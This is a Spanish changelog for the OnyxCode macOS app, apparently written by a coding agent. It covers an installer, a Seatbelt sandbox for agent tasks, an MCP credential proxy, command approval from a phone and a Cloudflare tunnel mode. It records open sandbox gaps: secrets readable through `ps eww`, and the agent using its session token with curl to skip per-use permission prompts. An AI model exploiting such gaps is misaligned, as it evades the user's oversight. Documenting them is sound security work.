- `scripts/install/install.sh` (POSIX, sin sudo): comprueba macOS arm64, descarga `.dmg` + `SHA256SUMS`, verifica SHA-256, copia la app a un temporal, exige que `codesign -d -r-` contenga el hash fijado `c778a963…` y solo entonces instala en `/Applications` o `~/Applications`; quita la cuarentena, desmonta y limpia con `trap`. Opciones `--version`, `--dry-run`, `--no-open`, `--uninstall` (nunca toca `~/Library/Application Support/OnyxCode`), `--help`. Mientras `RELEASES_REPO_DEFAULT` sea `PENDIENTE` (y sin `ONYXCODE_RELEASES_REPO`) se niega a ejecutarse.
- `scripts/install/make-cask.mjs` genera `packaging/homebrew-tap/Casks/onyxcode.rb` (`postflight` con `xattr -dr com.apple.quarantine`, `depends_on arch: :arm64`, `zap` sin datos); la cask incluida lleva marcadores `PENDIENTE`. No se creó ningún repositorio ni release.
- `docs/INSTALAR.md` (tres vías, aviso de primera apertura, verificación, desinstalar sin perder datos).
- Pruebas: `install.test.mjs` (12, con dobles de curl/hdiutil/codesign/shasum/ditto/xattr/uname) y `make-cask.test.mjs` (5), incluidas en `npm run test:release-scripts`. Sin red, sin Electron.
- Pendiente (dueño): ver informe; prueba real del script en un Mac con el `.dmg` publicado.

## F8-B75: sandbox de Tareas sin `process-info*` ajeno y tarjeta de escalada con tokens del tema

- `tasks/sandbox-profile.ts`: `(deny process-info*)` + `(allow process-info* (target self))`; probado con `sandbox-exec` real (`sandbox-profile.procinfo.test.ts`) y con `opencode serve` real (sin modelos). Snapshot de `sandbox-profile.test.ts` editado a mano (solo +5 líneas por caso; sin `-u`).
- Hallazgo: `KERN_PROCARGS2` (`ps eww`) no es denegable con Seatbelt en esta macOS; el hallazgo 6 de F8-B69 sigue abierto en esa parte (ver `docs/SEGURIDAD.md`).
- `EscalateCard.tsx`: `amber-*` fijos sustituidos por `warning` (token del tema, contraste AA en claro/oscuro); sin prueba axe ni snapshot de ese componente, no hubo que actualizar ninguno.

## F8-B74: aprobar comandos desde el celular ya no es automático (hallazgo 2 de la auditoría del remoto)

- `permission.reply «once»` de `bash`, `edit`, `external_directory`, `webfetch`, `task` y Control del Mac pasa de M a **D** (confirmación en el Mac con el comando o ruta exactos); `reject` sigue M, `always` nunca. `ONCE_SAFE_PERMISSIONS` (política y espejo `shared/remote/mac-confirm.ts`) ya no incluye `edit`, `bash`, `webfetch` ni `task`.
- Ajuste por dispositivo `canApproveCommands` (`devices-store.ts`, apagado por defecto, migración sin tocar `remote.bin`): se enciende solo en el Mac con diálogo nativo propio (`remote:setApproveCommands`, X para el celular), se apaga en Ajustes › Celular o con «Cortar todo»; auditoría `approve-enabled`/`approve-disabled`.
- Con el ajuste encendido, `bash`/`edit` se aprueban desde el celular solo si pasan `command-denylist.ts` (evaluada sobre el texto del motor, con `realpath`; ofuscaciones, expansiones y duda → D), con tope de 20 por celular y hora (`approval-limit.ts`) y `approve-command` en la auditoría (sin el texto). La lista es heurística, no un límite: documentado en `docs/SEGURIDAD.md` §3 tricies quinquies.
- La tarjeta de permiso del celular muestra los `patterns` junto al comando completo. Interfaz: interruptor por dispositivo con estado accesible, insignia y aviso fijo (es/en).
- Pruebas: `engine-proxy.test.ts` (ataques, tope, texto del motor), `command-denylist.test.ts`, `policy.test.ts`, `devices-store.test.ts`, `service-access.test.ts`, `MobileCode.render.test.tsx`. Sin snapshots regenerados.
- Pendiente: en el celular no se explica que un «Permitir una vez» de `bash`/`edit` con el ajuste apagado espera la confirmación del Mac (hasta 90 s); prueba manual con un celular real y el diálogo nativo (no se abrió Electron). `src/test/opencode-contract.test.ts` falla por una ruta de `src/main/compare` (de otra tanda), no por este cambio.

## F8-B76: comparar modelos lado a lado (lado main, `src/main/compare/**`)

- Contrato en `shared/ipc-code.ts`: tipos `CompareManifest`/`CompareColumnManifest`/`CompareMetrics`/`CompareAdoptResult`…, canales `compare:list|preflight|start|cancel|retry|diff|adopt|discard|close|exportBench` y el evento `compare:changed` (manifiesto completo). Esquemas estrictos en `ipc/schemas.ts` (claves extra, índice > 3, `models` de 1 o 5 y rutas/ramas del renderer se rechazan: solo pasa `{ id, index }`). Todos son clase **X** para el celular (`remote/policy.ts`); el evento, `deny`. Nuevos textos `merr.compare.*` (es/en).
- `CompareService`: copias `onyx-compare/<id8>-<n>` en `.<repo>-worktrees/` desde `HEAD` (si falla una, se deshacen todas, ramas incluidas), hooks de git desactivados, solo `execFile` con arrays; sesión por modelo con el SDK v2 del motor principal (`build`; `bypass` se rebaja a `auto`); arranques escalonados 1,5 s y máximo 2 a la vez en `opencode-go` y `opencode` (`limits.ts`/`scheduler.ts`); cuota («token rate limit», 429, `friendlyError` → `quota`) con UN reintento a los 20 s ± 5 y, si falla otra vez o el motor reintenta más de 2 veces, la columna se aborta y el proveedor queda en pausa (`compare:retry` lo reanuda); métricas por columna (tokens, coste, duración, diff; `null` y nunca 0).
- Cancelar = `session.abort` y espera de inactividad de 10 s como máximo; si no se confirma, `stopUnconfirmed` y **no se borra la copia** (`discard` lo rechaza y `close` conserva el manifiesto). Adoptar = `snapshotPatch` + `git apply --check --binary` y después el parche ENTERO sin commit (sin `--3way` ni `--reject`; `dirty-overlap` salvo `force`; parches con enlaces simbólicos rechazados). Manifiesto en `userData/compare/<id>.json` (atómico, 0600, validado al leer); al arrancar solo marca lo interrumpido y hace `git worktree prune`. Exportación de un lote JSON redactado (`onyx-compare` v1, claves de `RunResultSchema` v1; `redactSecrets`, diff ≤ 200 KB) con el diálogo nativo de guardado.
- Pruebas: `compare/{scheduler,rate-limit,metrics,manifest,bench-export,ipc,service}.test.ts` (git real en carpetas temporales y un motor falso; sin Electron ni modelos). Sin snapshots regenerados.
- Pendiente: la interfaz (ola 2); `POST /instance/dispose` no se llama (no figura en las rutas usadas verificadas con el binario fijado: se añadiría a `api-routes.json` con `check:opencode`); sin adjuntos en v1 (solo texto); prueba manual con modelos reales y con los límites reales de Go.

## F8-B80: dictado de voz, Fase 0 (prototipo de medición, aislado)

- Nuevo `resources/dictation/onyx-dictate/main.swift`: helper mínimo (sin dependencias, no integrado en la app) que captura el micrófono con `AVAudioEngine` solo en memoria y reconoce en el dispositivo (`SpeechAnalyzer` en macOS 26+; `SFSpeechRecognizer` con `requiresOnDeviceRecognition = true` en versiones anteriores). Sin modelo local imprime `no-disponible` y sale; nunca usa el servidor. JSON por línea (`partial|final|state|error`), idiomas `es-CL|es-ES|en-US`, parada a 8 s de silencio y tope de 120 s, salida limpia con SIGINT/SIGTERM, sin texto en logs.
- `scripts/dictation/build.sh` (compila fuera del repo, firma ad-hoc, sin versionar binarios) y `measure.md` (guía corta de medición para el dueño). Prueba sin micrófono: `node --test scripts/dictation/protocol.test.mjs` (parseo de líneas, máquina de estados y, con `ONYX_DICTATE_BIN`, el `--self-test` del binario).
- Pendiente: la medición real (permisos, calidad en es-CL, latencia, CPU) la hace el dueño; no se ejecutó el micrófono. La integración (Fase 1) no se ha hecho.

## F8-B79: proxy local de MCP fuera del sandbox de Tareas (cierra el hallazgo 6)

- Nuevo `src/main/tasks/mcp-proxy.ts` (`McpProxy`): proxy en `127.0.0.1` (puerto aleatorio) en main, fuera de Seatbelt. El `opencode serve` sandboxeado recibe solo URL loopback + token de sesión (uno por servidor MCP, 32 bytes, caduca a las 12 h, revocable, comparado en tiempo constante); el proxy inyecta las cabeceras reales. Destinos en lista cerrada, rutas normalizadas (`safeUpstreamRest`), sin redirecciones, `Host`/`Origin` validados, cabeceras en lista cerrada, límites de cuerpo/concurrencia/tiempo, sin secretos en registros, apagado limpio.
- `manager.ts`: en sandbox el MCP del navegador y los MCP remotos con cabeceras van por el proxy; Seatbelt solo abre el puerto del proxy (ya no el del MCP del navegador); el proxy se apaga con el proceso. `mcp-tasks.ts`: los MCP locales con `environment` secreto NO entran en el sandbox (falla cerrado) y los remotos con cabeceras ya no suman su host a la red; `clientSecret` de OAuth no viaja. Aviso en Ajustes › MCP (`mcp.flags.envWarn`, es/en) vía `TasksMcpInfo.localSecrets`. `ipc/diagnostics.ts`: los tokens de sesión entran al redactor.
- Pruebas: `mcp-proxy.test.ts` (19), `mcp-tasks.sandbox.test.ts` (9, con `ps eww` real: el control sin proxy revela los secretos), `mcp-proxy.real.test.ts` (Seatbelt + opencode 1.18.33 reales sin modelos). No se tocó ningún snapshot ni `sandbox*`/`opencode-config`.
- Abierto (documentado en `docs/SEGURIDAD.md` §3 tricies sexies): MCP locales con secretos no disponibles en el sandbox; el agente puede usar el token de sesión con `curl` (salta «preguntar en cada uso»); secretos en `command`/`cwd`; SSE antiguo con `endpoint` absoluto; Control total sin cambios. Prueba manual del dueño pendiente (Tarea real con MCP real).

## F8-B78: comparar modelos lado a lado (interfaz, `features/compare/**` + integración en Code y Chat)

- Vista de columnas (`CompareView`/`CompareColumn`): una por modelo, mín. 300 px y desplazable en horizontal; píldora de estado (en cola, arrancando, trabajando, listo, error, límite de uso, cancelado, elegido, interrumpido, descartado) en `aria-live="polite"`, tokens ↑/↓, coste, duración, insignias (más barato, más rápido, menos cambios; solo con ≥2 columnas hechas y dato en ≥2), conversación en vivo (Markdown en streaming y herramientas en una línea), permisos pendientes de la columna con «Permitir una vez»/«Rechazar», cajón lateral de diff (Esc lo cierra y devuelve el foco), «Quedarme con este»/«Seguir con este» (confirmación; `dirty-overlap` se puede repetir con `force`; `conflict` ofrece «Abrir la copia» y «Copiar el parche»; `empty`/`symlink`/`not-ready` se explican), «Descartar», «Cancelar todo», «Guardar en el banco» (solo al terminar) y «Cerrar» (con confirmación; si main conserva copias por parada sin confirmar se avisa y la comparación sigue). Las métricas `null` se pintan «—» y NUNCA «$0» (`costLabel` trata también el 0 como no informado).
- Cuota: la columna `rateLimited` con `retryAt` pinta la cuenta atrás («Reintento en N s», `useNow` cada 1 s) y con `retryAt` null «En pausa por límite de uso» + «Reintentar» (también en las columnas en cola de un proveedor en pausa). Recuperación: las comparaciones del manifiesto sin vista abierta salen en una franja «Abrir · Descartar» y sus columnas `interrupted` se pintan como «Interrumpido».
- Lanzamiento: botón «Comparar» (icono `Columns3`, `aria-haspopup`) en el compositor de Code (`ModelControls`) y de Chat (pie), lanzador de 2–4 modelos (`role="listbox"`, ↑ ↓ Espacio Enter Esc, aviso «máx. 2 a la vez» para los proveedores con tope, 4 máximo, sin duplicados), chip «Comparar ×N» con ✕ y título del botón de enviar «Comparar en N modelos». Al enviar, diálogo previo (modal) con el ×N y el gasto de hoy (`loadGlobalUsage`, ahora exportado), el commit de partida si el árbol tiene cambios (`compare:preflight`), «sin dependencias instaladas» y «No volver a mostrar» (localStorage en try/catch; solo salta si el árbol está limpio); se bloquea con mensaje si no hay repositorio, hay adjuntos (v1 solo texto) o ya hay una comparación activa. Gancho acordado: `maybeInterceptSubmit(text, ctx)` (síncrono, Code: el borrador se limpia al arrancar) y `requestCompare(ctx)` (promesa, Chat: `false` restaura el borrador).
- Estado (`store.ts`): un solo flujo de eventos del motor filtrado por los `sessionID` del manifiesto (y, para permisos de subagentes, por la carpeta de la copia), reducido con `reduceEvent` y cola por frame; los permisos de estas sesiones NO pasan por `useCode`; al reconectar se vuelven a pedir los mensajes. En Chat las sesiones de una comparación sin elegir se ocultan de la lista (`metadata.compare`, `isHiddenCompareSession`); al elegir una se renombra con el mensaje, se abre y queda como conversación normal.
- Celular: `compareApi()` devuelve `null` en la superficie remota; botón, franja, diálogo y sincronización no existen allí y no se llama a ningún `compare:*`.
- Textos es/en (`compare.*`, sin nombrar productos de terceros), tokens del escritorio sin colores nuevos; los archivos nuevos entran en `MIGRATED`.
- Pruebas (sin Electron, sin snapshots regenerados): `compare/model.test.ts` (16), `store.test.ts` (30, cliente falso: reducción por sesión, ciclo de vida, lanzamiento, adopción, cierre con copias retenidas, celular) y `CompareView.render.test.tsx` (37: estados, métricas «—», cuenta atrás con reloj falso, ×N, accesibilidad, celular). E2E `e2e/specs/comparar.e2e.ts` (Code, cancelar, recuperación tras reiniciar y Chat) ESCRITO SIN EJECUTAR: necesita en el falso `forModel` por guion y el modelo `opencode-go/fake-go-model` (trabajo de Q).
- Pendiente: ejecutar el E2E; cambiar de proyecto con columnas en curso no pide confirmación (la comparación sigue viva y vuelve a verse al regresar); sin respuesta a preguntas (`question.asked`) dentro de una columna (solo permisos); capturas claro/oscuro a 900 px; prueba manual con modelos reales.

## F8-B77: control remoto fuera de casa, entrega 1 (protocolo v4, servicio de conexión, sitio HTTPS firmado)

- **Alcance**: opcional y apagado por defecto. Selector «Solo esta red» / «También fuera de casa» en Ajustes › Celular (textos neutros: «servicio de conexión»; Cloudflare solo en la documentación). Passkeys (N10) y avisos push (N11) NO entran: entregas aparte. TURN implementado pero APAGADO (`TURN_ENABLED=false`, sin secretos); solo STUN. Nada se publicó, no se tocó Cloudflare ni se hizo ninguna petición de red.
- **N1** `AsyncClientHandshake` con `AuthMac` inyectado (noble o `CryptoKey` HKDF→HMAC no exportable en `pwa/src/keys.ts`, almacén IndexedDB en `store.ts`); misma criptografía v3. **N2** protocolo v4 (el Mac acepta v3 y v4): `caps` en `authed`/`pair-pending`, `room` en `paired`, `b` en `hs1`, trama `turn`, códigos `host-offline`/`rate`; `cloud.ts` (salas, código Crockford de 16 caracteres, tramas Mac↔servicio).
- **N3** `cloud/remoto-worker/` (Worker + Durable Object que hiberna sin guardar nada, `wrangler.jsonc` sin secretos, README con los pasos del dueño) sobre `RoomCore` puro compartido (`src/shared/remote/room-core.ts`): sala por Mac `sha256(hostToken)`, ≤ 2 celulares, ≤ 30/min, ≤ 80 tramas y 60 s, host muerto a 150 s, `ready` en 5 s, TURN solo tras `grant` y antes de la siguiente trama (≤ 20/h), `routeEdge` (sala válida y `Origin` antes de despertar nada).
- **N4** `CloudSignalingTransport` (el Mac sale hacia fuera, sin puertos; reintento con espera exponencial, ping, `suspend`/`resume`/cambio de red), `SignalSession` compartida con la red local, `FakeCloud` (ws en 127.0.0.1 con el mismo `RoomCore`), `hostToken` en `remote.bin` (rota con «Quitar todos»), «Disponible fuera de casa», respondedor WebRTC creado al llegar la offer con STUN/TURN, gracia de 6 s en `disconnected`, `powerMonitor`, política `allowOutsideNetwork`/`allowRelay`/`allowPush`/`requirePasskey` (con archivo y clave ausente = cerrado).
- **N5** PWA en HTTPS: modo nube (`isSecureContext` + origen exacto), vinculación por código escribible además del QR, `entry` con SRI (el Mac manda los sha384 de SU interfaz), reintento con `v-1`, pantallas «Tu Mac no está disponible»/«No se pudo guardar el vínculo», guía de instalación, `sw.js` (61 líneas, nunca toca `/v1/*`), manifiesto, iconos, `scripts/build-site.mjs` → `pwa/dist-site` con `_headers` (CSP estricta). **N6** `remote:setConnection`/`remote:setAway` (esquema estricto, clase X), Ajustes con estado del servicio, vigilancia y «vía relé», código visible junto al QR, auditoría (`cloud-started`, `connection-changed`, `away-*`, `site-*`). **N7** `site-watch.ts` (firma Ed25519 sobre bytes exactos, `seq` sin retrocesos, hashes del arranque y CSP, cada 6 h; si no cuadra se pausa el modo nube) y `scripts/site-release.mjs` (firma en el Mac del dueño, sin CI ni despliegue, archivo de 10 versiones). **N8** docs: `SEGURIDAD.md` §3 tricies septies, `REMOTO-FASE2`, `PRIVACIDAD-BORRADOR`, `REMOTO-PRUEBA-MANUAL`, `DISTRIBUCION` (primero el sitio, después la app), `POLITICA-ORGANIZACION`, `AGENTS.md` §8.
- **Pruebas** (todas con dobles, sin red): `room-core.test.ts` (33), `cloud.test.ts`, `protocol-v4.test.ts`, `worker-client.test.ts` (23, también contra `FakeCloud`), `service-cloud.test.ts` (19: vinculación y reconexión por la nube, TURN solo tras `authorize`, política, pausa del sitio, `away`, auditoría), `site-watch.test.ts` (21, incluido de punta a punta con `site-release.mjs`), `pwa-keys.test.ts` (vector idéntico noble/WebCrypto, clave no exportable, IndexedDB falso), `pwa-site.test.ts`, `entry-info.test.ts`, `org-policy.test.ts`, `devices-store.test.ts`, `peer-session-caps.test.ts`, `rtc-ice.test.ts`, `ipc-cloud.test.ts`, `scripts/site-lib.test.mjs` (9). Verificado: `npm run typecheck`, `build:pwa`, vitest de `src/main/remote`, `src/shared/remote`, `src/renderer/remote`, `src/main/ipc`, `src/shared/i18n` y `src/test`, eslint y prettier de lo tocado.
- **Fuera de mi mano**: `src/renderer/remote/i18n-core.test.ts` falla solo por las 110 claves `compare.*` de la interfaz de comparar (lo regenera quien las añadió con `UPDATE_PWA_I18N=1`); no se tocó. `pwa/budget.json`: `index.js` sube de 40 a 44 KB gzip (código nuevo de la capa ligera: almacén, claves, código escribible); el arranque total y `boot.js` ya superaban su presupuesto antes.
- **Pendiente / lo hace el dueño** (`cloud/remoto-worker/README.md`): `wrangler login` con la cuenta Onyx, clave de firma Ed25519 y poner la pública en `SITE_PUBLIC_KEY`, publicar el sitio, dominio `remoto.onyxcode.cl`, HSTS, regla de límite por IP, alertas de facturación; la prueba manual (`REMOTO-PRUEBA-MANUAL.md` pasos 14–22: iPhone/Android reales, datos móviles, Mac dormido). Por verificar en el entorno real: binding de rate limiting y límite de archivos del plan gratuito, ping con respuesta automática facturable, `integrity` en `modulepreload` en iOS, «vía relé» con `getSelectedCandidatePair`. No se construyó Electron ni se corrió E2E; los preloads secundarios no se tocaron.

## F8-B82: motor falso para comparar modelos y elemento (e2e/fake-opencode, comparar.e2e.ts)

- `e2e/fake-opencode/server.mjs`: filtro `forModel: 'proveedor/modelo'` en los guiones (`POST /__e2e/script`; solo lo toma el `prompt_async` cuyo `body.model` coincide, con su respuesta, `startDelayMs`, `cost` y fallo propios); paso `{ type: 'error', preset: 'quota' }` (APIError 429, «token rate limit exceeded», que `friendlyError` clasifica como `quota`); `POST /instance/dispose` aceptado (devuelve `true`, contador `instanceDisposeCount` en `/__e2e/status`). Contra lo previsto, esa ruta SÍ figura en `resources/opencode-bin/api-routes.json`; el main de comparar no la llama y el spec no la exige.
- Ya existían y solo se cubren con prueba: `opencode-go/fake-go-model` en `/provider`, `/config/providers` y `connected` (catálogo de 5 proveedores) y las partes del usuario con `metadata`/`synthetic` devueltas tal cual (sirve al chip de elemento y a comparar).
- `comparar.e2e.ts`: cabecera al día, usa el preset de cuota y comprueba que cada modelo recibió su propio `prompt_async`. Sin entrada en `e2e/win-skip.json`: esa lista es de specs enteras y el bloque de Chat sí corre en Windows; los de Code ya van con `describe.skipIf(IS_WIN)`.
- Pruebas: `node --test e2e/fake-opencode/server.test.mjs` (19, una nueva). No se ejecutó Electron ni `test:e2e`; typecheck verde. eslint/prettier señalan solo líneas anteriores de `server.mjs`/`server.test.mjs` (no se reformateó).

## F8-B83: la PWA del celular vuelve al presupuesto (arranque 345 → 285 KB gzip, `boot.js` 262 → 201 KB)

- Causa: `features/compare/**` (interfaz de «Comparar modelos», ~110 claves `compare.*`) viajaba en `boot` aunque en el celular `compareApi()` es `null`; `CompareColumn` importaba `components/Markdown` de forma estática y arrastraba react-markdown/micromark (~50 KB gzip) de vuelta al arranque, deshaciendo el trozo perezoso de B65.
- Arreglo: `shims/no-compare.tsx` (misma forma pública que `features/compare/index.ts`, inerte) sustituye ese índice vía SWAPS en `ChatView`, `ChatSidebar`, `CodeWorkspace`, `Composer` y `ComposerControls`. No se tocó la interfaz de escritorio. La burbuja del chip de elemento (`ElementReadonlyChip`, B72) sigue en el arranque a propósito: se ve en los mensajes ya enviados; su coste es pequeño (`ElementChip` ~2 KB gzip) y no se hizo perezosa.
- Pruebas: `swaps.test.ts` exige ahora que el arranque (grafo estático de `main`+`boot`, con SWAPS) no contenga `features/compare`, `onboarding`, Sidebar/CommandPalette/UpdateNotice/RemotePairHost/RemoteConfirmHost ni `keybindings/dispatch`, y que `ElementChip` sí esté; `shims/no-compare.test.tsx` exige que el shim exporte todo lo del índice real y sea inerte.
- Diccionario de arranque regenerado al final con `UPDATE_PWA_I18N=1` (+ prettier, para no reescribir el formato): el diff solo suma `compare.send` (título del botón de enviar del compositor, que sí está en el arranque).
- Tamaños (gzip KB): arranque 345,1 → 284,6 (tope 300); `boot.js` 261,7 → 201,3 (tope 210); JS min de arranque ~ 910 → 756 KB (tope 780); `index.js` 41,4, `main.js` 22,1 y `boot.css` 18,9 sin cambios. No se subió ningún presupuesto. Margen justo: `boot.js` min 688,8 / 690.

## F8-B81: Tareas en Windows (WSL2), preparación sin activar y Seatbelt extraído a un backend (T-W1 a T-W3, parte de la Mac)

- Qué: `src/main/tasks/backends/` con la interfaz `SandboxBackend` (`types.ts`), Seatbelt extraído sin cambios (`seatbelt.ts`, `none.ts`, `spawn.ts`, `selectBackend`) y `startTasksServer` delegando en él; `platform-caps` con `tasksSandbox` (`seatbelt`/`wsl`/`none`) y la bandera de producto `tasksWin` (apagada: Windows sigue sin Tareas); módulos puros del backend WSL (`wsl-paths`, `wsl-spec`, `bridge-protocol`, `wsl-status`), `WslBridgeHost` y `WslBackend` con `wsl.exe` simulado (NO enlazado en producción); lanzador de Python con Landlock como recurso (`resources/wsl/`, excluido del `.asar`). Documentación: `docs/WINDOWS-TAREAS.md` y `docs/SEGURIDAD.md` §3 tricies octies.
- Autorización del dueño para tocar `sandbox*`, `proxy*` y `provider-egress` solo para la extracción: `sandbox-profile.ts`, `proxy.ts`, `proxy-policy.ts` y `provider-egress.ts` no cambian; `sandbox.ts` solo delega el lanzamiento.
- Prueba de equivalencia: `sandbox.equivalence.test.ts` contra `__fixtures__/seatbelt-before.json`, capturado con el código anterior en commits previos (`baeb0bd`, `c70fbdb`): 9 perfiles SBPL idénticos byte a byte y 4 lanzamientos completos con el mismo `command`, `args`, `env`, opciones de `spawn`, proxies, `trackPid`/`killTree` y limpieza. Los tests existentes de `src/main/tasks` y `src/main/ipc` pasan sin editar ni regenerar ningún snapshot. Ver nota: durante la captura se vio que el valor aleatorio del centinela dependía del ORDEN de las llamadas a `randomBytes`; el doble ahora es determinista por tamaño y el «antes» se recapturó con el `sandbox.ts` original.
- Seguridad: la clave real no cabe en la trama inicial (lista cerrada de entorno, `OPENCODE_AUTH_CONTENT` solo con centinelas, defensa extra `forbid`); `wsl.exe` solo con comandos de una lista cerrada y NUNCA `--shutdown`; el lanzador falla cerrado sin Landlock (ABI < 2), con interop o con unidades montadas; sin `REMOVE_*`/`REFER` en la carpeta si no hay `allowDelete`; el puente solo conecta a los puertos permitidos. `backends.static.test.ts` amplía a `backends/*` la guardia estática de credenciales.
- Pruebas: 165 en `src/main/tasks/backends` (rutas, spec, protocolo con fuzz de semilla fija < 2 s, puente con dobles, estado, backend, estáticas), `platform-caps.test.ts` (matriz plataforma × bandera) y 16 en Python (`resources/wsl/test_protocol.py`, vectores compartidos con TypeScript). Typecheck, ESLint y Prettier en verde; nada se ejecutó en Windows ni se instaló WSL.
- Pendiente (necesita el PC y decisiones del dueño): `docs/WINDOWS-TAREAS.md` (rootfs, `setup`, integración T-W4, ataques A1-A15 en sesión elevada y NO elevada por WSL#12443, y las decisiones abiertas).

## F8-B84 — Comparar modelos: prueba end-to-end en verde

- Causa raíz en el SPEC (`e2e/specs/comparar.e2e.ts`): el lanzador nace con el modelo actual ya marcado, así que hacer clic en «Fake Model» lo desmarcaba y el botón quedaba en «Comparar (1)» (deshabilitado por `min`); el diálogo de «Quedarme con este»/«Cerrar» es `alertdialog`, no `dialog`; en Chat no hay botón «Comparar en N modelos» (se envía con Enter); la rama `onyx-compare/*` se borra justo después de la copia y la apertura de la conversación elegida es asíncrona (ahora se esperan con `expect.poll`).
- Defecto real de la interfaz (`features/compare/store.ts`): un `compare:changed` rezagado tras cerrar resucitaba el manifiesto y volvía a pedir los mensajes de una sesión ya borrada (404 en consola). Ahora `applyManifest` ignora ids cerrados; prueba unitaria en `store.test.ts`.
- Motor falso y main de comparar: sin cambios (los modelos y nombres eran correctos). 4/4 pruebas e2e en verde (2 ejecuciones seguidas).

## F8-B85: Modo viaje (túnel rápido de Cloudflare sin cuenta), lado del Mac (T1–T5)

- **Binario** (`src/main/remote/tunnel/binary.ts`, `resources/cloudflared/pin.json`, `scripts/cloudflared/pin.mjs`): `cloudflared` 2026.9.3 darwin-arm64 descargado bajo demanda con consentimiento y verificado con DOS hashes (el del `.tgz` y el del binario extraído, valores medidos en T0), tamaños exactos y firma Developer ID Cloudflare Inc. (equipo `68WVV388M8`) comprobada con `codesign` antes de instalar y re-verificada (hash y firma) antes de cada arranque; descarga solo de hosts de GitHub, `tar` de un único archivo regular, `0700`. El generador del pin exige tres fuentes y solo se prueba con dobles (no se descargó nada real).
- **Proceso** (`tunnel/cloudflared.ts`, `backoff.ts`, `opencode/pids.ts`): grupo propio, `withDisclaim`, vigía `/bin/sh` de `stdin` (verificado en T0) que además delata la muerte por el cierre de `stderr`, entorno mínimo con `HOME` privado, siempre `--no-autoupdate` y nunca `--config`, URL con regex estricta solo tras el banner, `pids.json` + `isOurCloudflared` en `killStaleServers` (también limpia un `cloudflared` vivo cuyo vigía murió), `stop()`/`killNow()`, reintentos 2–60 s (máx. 6; `rate` 60 s). `cloudflared` falso en `e2e/fake-cloudflared/` con modos de fallo (sin URL, URL tardía, dos URL, URL mala, caída, 429, config, borde caído, ignora SIGTERM, nieto, salida basura, `inject`, 522, corte por inactividad).
- **Servidor** (`signaling/lan-server.ts`, `tunnel-gate.ts`, `tunnel-limits.ts`, `tunnel-selfcheck.ts`, `tunnel-transport.ts`): servidor ligado a 127.0.0.1, 503 hasta tener nombre, `Host`/`Origin` exactos, puerta `/k/<T>` con galleta `__Host-onyxk`, 404 idéntico para todo lo no listado (también `/cdn-cgi/` y `/ws` sin galleta), límites de ritmo, keepalive del WebSocket (ping 25 s, cierre a los 90 s), CSP con `wss://<host>`, autocomprobación del Mac contra su propia página antes del QR. El comportamiento LAN no cambia (sus pruebas siguen verdes sin tocarlas).
- **Servicio** (`service.ts`, `devices-store.ts`, `peer-session.ts`, `audit.ts`, `org-policy.ts`, `loader.ts`, `index.ts`): modo `travel` sin IP local con STUN públicos, QR `/k/<T>#s=<q>`, PIN obligatorio y vínculo efímero `kind: travel`, bloqueo por política/passkey/confirmar cada conexión, cierres (30 min, 4/12/24 h con tope `travelMaxHours`, «Cortar todo», salir, política en caliente, caída), `bye{travel-ended}`, `travel-url-changed` con revocación, auditoría `travel-*`, política `allowTravelMode`/`travelMaxHours`/`allowTravelRelay`/`allowTravelDownload` (fail closed) ya leída de `managed.json`.
- **Contratos para la interfaz** (`src/shared/remote/travel.ts`): tipos del estado (`TravelState`), constantes, esquemas estrictos de `remote:travelInstall` (`{ consent: true }`) y `remote:setTravelKeep`; cambios mínimos en `src/shared/ipc-remote.ts` (`RemoteConnection` + `travel`, `RemoteState.travel`, `RemotePolicyView`, `RemoteDeviceInfo.kind`) y `bye.reason` + `travel-ended` en `protocol.ts`. La interfaz de Ajustes, el consentimiento y la PWA quedan para la tanda siguiente.
- Docs: `docs/SEGURIDAD.md` (§3 tricies novies) y `docs/POLITICA-ORGANIZACION.md`. Pruebas: `cloudflared.test.ts`, `binary.test.ts`, `pin-lib.test.ts`, `lan-server-tunnel.test.ts`, `tunnel-transport.test.ts`, `service-travel.test.ts`, además de `org-policy`, `devices-store`, `audit` y `shared/remote/travel.test.ts`. Sin red real, sin Electron, sin túneles reales.

## F8-B86: Modo viaje, interfaz, PWA del celular, avisos y documentación (T6–T8)

- **Canales** (`src/shared/ipc-remote.ts`, `src/main/ipc/{schemas,remote-handlers}.ts`, `src/main/remote/policy.ts`): `remote:travelInstall` (`{ consent: true }` exacto) y `remote:setTravelKeep` registrados en `REMOTE_INVOKE_CHANNELS` (el preload remoto los toma de la lista), con `parseTravelInstallRequest`/`parseSetTravelKeepRequest` y clase **X** (el celular no puede usarlos); `remote:setConnection` acepta `travel`. No se tocó el servicio del Mac de B85.
- **Interfaz** (`features/settings/impl/TravelPanel.tsx` + `RemoteSection.tsx`, claves `remote.travel.*` es/en): selector «Solo esta red» / «Modo viaje (sin cuenta), experimental» (sin servicio fijo ni Workers: «También fuera de casa» solo se muestra si ya estaba elegido), explicación honesta, diálogo de consentimiento antes de descargar (botón «Descargar y activar», foco en Cancelar), duración `idle30`/4/12/24 h recortada por `travelMaxHours`, estados con `aria-live` y movimiento reducido, cuenta atrás solo con duración fija, errores por código, bloqueos por política/confirmar/passkey, QR «válido solo para este túnel», sin soporte (no macOS o `unsupported`) se explica y no se ofrece.
- **PWA** (`pwa/src/{mode,rtc,client,store,main,ui,i18n}.ts`): `isTravelMode` (HTTPS + origen exacto del túnel), vínculo en IndexedDB del origen sin sala (`idbLinkStore({ roomless })`), `TRAVEL_STUN_URLS`, ICE de 12 s → `ice-failed`, reintento del WebSocket ante el 522 (`TRAVEL_WS_RETRY`), estados «el enlace caducó» / «el Mac no responde» / «tu red bloquea la conexión directa», `bye travel-ended` (con prueba del Mac) borra el vínculo y lo explica, sin instalar (`beforeinstallprompt` bloqueado) ni service worker. Peso: arranque 286,1 KB gzip (tope 300), `boot.js` 201,3 (tope 210); `i18n-core-keys.json` no hizo falta regenerarlo.
- **Docs**: `docs/SEGURIDAD.md` §3 quadragies (modelo de amenazas final y tabla honesta por tipo de red, con lo NO verificado marcado), `docs/REMOTO-PRUEBA-MANUAL.md` (pasos 23–35 con datos móviles y otra Wi-Fi), `THIRD_PARTY_NOTICES.md` (cloudflared, Apache-2.0, 2026.9.3, no se redistribuye), `AGENTS.md`. `docs/POLITICA-ORGANIZACION.md` ya tenía las cuatro claves (B85).
- **Pruebas**: `ipc-travel.test.ts` (esquemas estrictos, clase X, solo ventana principal), `TravelPanel.test.tsx` (estados, errores, bloqueos, selector bajo política, sin soporte, consentimiento obligatorio y orden consentir→descargar→activar, es/en), `src/test/pwa-travel.test.ts` (patrón de origen, STUN, reintento 522, `ice-failed` a 12 s, `travel-ended`, errores, almacén sin sala). Sin Electron, sin descargar `cloudflared`, sin túneles; sin snapshots regenerados.
